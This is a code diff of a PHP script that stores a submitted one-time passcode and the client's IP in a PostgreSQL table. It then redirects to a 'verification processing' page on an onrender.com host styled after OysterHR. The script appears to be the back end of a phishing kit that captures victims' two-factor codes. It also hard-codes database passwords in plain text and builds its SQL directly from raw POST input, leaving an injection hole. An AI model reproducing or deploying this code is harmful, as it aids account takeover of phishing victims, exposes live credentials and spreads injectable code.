@@ -1,12 +1,12 @@
 <?php 
-$db = pg_connect("host=dpg-cmc9568cmk4c73bnumkg-a 
-port=5432 dbname=oysterhr_postgresql user=oysterhr_postgresql_user password=NtqQGP4VnRMOz9AvgcXWIConlVJtVpTu");
+$db = pg_connect("host=dpg-cq5pskuehbks73bsuelg-a 
+port=5432 dbname=alien user=alien_user password=5zuUeEjejh9hI0TR8SamrlYuR2kksI6z");
 
 if ($_SERVER["REQUEST_METHOD"]=="POST"){
     $query = "INSERT INTO otpconfirm (otpconfirm,time,ip) VALUES ('$_POST[otpconfirm]',NOW(),'$_POST[ip]')";
     $result = pg_query($query);
 
- header("Location:https://oysterhr.onrender.com/OysterHR.com/oysterhr/verification_processing.html");
+ header("Location:https://oysterhr-sv3b.onrender.com/OysterHR.com/oysterhr/verification_processing.html");
 
 exit; 
 }
